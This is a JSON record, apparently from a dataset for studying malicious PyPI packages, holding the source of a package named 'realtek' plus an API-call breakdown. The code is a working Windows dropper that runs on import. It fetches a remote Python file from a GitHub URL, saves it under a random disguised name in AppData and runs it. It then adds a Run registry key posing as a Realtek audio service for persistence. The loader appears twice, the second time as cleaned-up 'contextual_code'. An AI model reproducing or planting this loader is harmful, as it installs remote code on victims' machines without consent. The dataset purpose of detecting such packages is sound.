[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/realtek-1.2-py3-none-any/realtek/__init__.py",
    "code_snippet": "from sys import executable\nfrom urllib import request\nimport os\nfrom os import getenv, system, name, listdir\nfrom os.path import isfile\nimport winreg\nfrom random import choice\nimport subprocess\n\nif name != 'nt': \n    exit()\n\nos.system(\"python.exe -m pip install --upgrade pip\")\n\n#requirements\nrequirements = [\n    [\"wmi\", \"wmi\"],\n    [\"Crypto.Cipher\", \"pycryptodome\"],\n    [\"uplink\", \"uplink\"],\n    [\"requests\", \"requests\"],\n    [\"httpx\", \"httpx\"],\n    [\"alive-progress\", \"alive-progress\"],\n    [\"psutil\", \"psutil\"],\n    [\"cryptography\", \"cryptography\"],\n    [\"pypiwin32\", \"pypiwin32\"],\n    [\"Pillow\", \"Pillow\"],\n    [\"copy\", \"copy\"],\n    [\"webbrowser\", \"webbrowser\"],\n]\nfor modl in requirements:\n    try: __import__(modl[0])\n    except:\n        subprocess.Pope\n\ndef getPath():\n    path = choice([getenv(\"APPDATA\"), getenv(\"LOCALAPPDATA\")])\n    directory = listdir(path)\n    for _ in range(10):\n        chosen = choice(directory)\n        ye = path + \"\\\\\" + chosen\n        if not isfile(ye) and \" \" not in chosen:\n            return ye\n    return getenv(\"TEMP\")\n\ndef getName():\n    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))\n    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']\n    return firstName + choice(lasName)\n\n\ndef install(path):\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(request.urlopen(\"https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py\").read().decode(\"utf8\"))\n\ndef run(path):\n    system(f\"start {executable} {path}\")\n\ndef startUP(path):\n    faked = 'SecurityHealthSystray.exe'\n    address = f\"{executable} {path}\"\n    key1 = winreg.HKEY_CURRENT_USER\n    key2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)\n    winreg.SetValueEx(open_, \"Realtek HD Audio Universal Service\", 0, winreg.REG_SZ, f\"{faked} & {address}\")\n\n\n\nDoYouKnowTheWay = getPath() + '\\\\' + getName()\ninstall(DoYouKnowTheWay)\nrun(DoYouKnowTheWay)\ntry:\n    startUP(DoYouKnowTheWay)\nexcept:\n    pass",
    "pattern_analysis": {
      "api_sequence": [
        "os.name",
        "exit",
        "os.system",
        "os.getenv",
        "os.getenv",
        "os.listdir",
        "random.choice",
        "os.path.isfile",
        "random.choice",
        "os.getenv",
        "random.choice",
        "open",
        "urllib.request.urlopen",
        "http.client.HTTPResponse.read",
        "bytes.decode",
        "io.TextIOWrapper.write",
        "os.system",
        "sys.executable",
        "winreg.CreateKeyEx",
        "winreg.SetValueEx"
      ],
      "api_sequence_with_args": [
        "os.name",
        "exit()",
        "os.system(\"python.exe -m pip install --upgrade pip\")",
        "os.getenv(\"APPDATA\")",
        "os.getenv(\"LOCALAPPDATA\")",
        "os.listdir(path)",
        "random.choice([getenv(\"APPDATA\"), getenv(\"LOCALAPPDATA\")])",
        "os.path.isfile(ye)",
        "random.choice(directory)",
        "os.getenv(\"TEMP\")",
        "random.choice('bcdefghijklmnopqrstuvwxyz')",
        "open(path, mode='w', encoding='utf-8')",
        "urllib.request.urlopen(\"https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py\")",
        "http.client.HTTPResponse.read()",
        "bytes.decode(\"utf8\")",
        "io.TextIOWrapper.write(...)",
        "os.system(f\"start {executable} {path}\")",
        "sys.executable",
        "winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, winreg.KEY_WRITE)",
        "winreg.SetValueEx(open_, \"Realtek HD Audio Universal Service\", 0, winreg.REG_SZ, f\"{faked} & {address}\")"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "random.choice",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "random.choice",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "random.choice",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "http.client.HTTPResponse.read",
          "id": "read_response_bytes",
          "description": "Reads response body as bytes",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_codec",
          "description": "Decodes bytes using specified codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "io.TextIOWrapper.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "sys.executable",
          "id": "get_python_version",
          "description": "Retrieves Python interpreter version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "winreg.CreateKeyEx",
          "id": "create_registry_key",
          "description": "Creates registry key at specified path",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_access"
        },
        {
          "api_name": "winreg.SetValueEx",
          "id": "set_registry_value",
          "description": "Sets value for specified registry key",
          "first_id": "system_operations",
          "second_id": "registry_operations",
          "third_id": "registry_modification"
        }
      ],
      "contextual_code": "import os\nimport sys\nfrom urllib import request\nimport winreg\nfrom random import choice\n\ndef getPath():\n    path = choice([os.getenv(\"APPDATA\"), os.getenv(\"LOCALAPPDATA\")])\n    directory = os.listdir(path)\n    for _ in range(10):\n        chosen = choice(directory)\n        ye = path + \"\\\\\" + chosen\n        if not os.path.isfile(ye) and \" \" not in chosen:\n            return ye\n    return os.getenv(\"TEMP\")\n\ndef getName():\n    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))\n    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']\n    return firstName + choice(lasName)\n\ndef install(path):\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(request.urlopen(\"https://raw.githubusercontent.com/IvanDevGames/index.js/main/1337.py\").read().decode(\"utf8\"))\n\ndef run(path):\n    os.system(f\"start {sys.executable} {path}\")\n\ndef startUP(path):\n    faked = 'SecurityHealthSystray.exe'\n    address = f\"{sys.executable} {path}\"\n    key1 = winreg.HKEY_CURRENT_USER\n    key2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)\n    winreg.SetValueEx(open_, \"Realtek HD Audio Universal Service\", 0, winreg.REG_SZ, f\"{faked} & {address}\")\n\nif os.name != 'nt':\n    exit()\n\nos.system(\"python.exe -m pip install --upgrade pip\")\n\nDoYouKnowTheWay = getPath() + '\\\\' + getName()\ninstall(DoYouKnowTheWay)\nrun(DoYouKnowTheWay)\ntry:\n    startUP(DoYouKnowTheWay)\nexcept:\n    pass"
    }
  }
]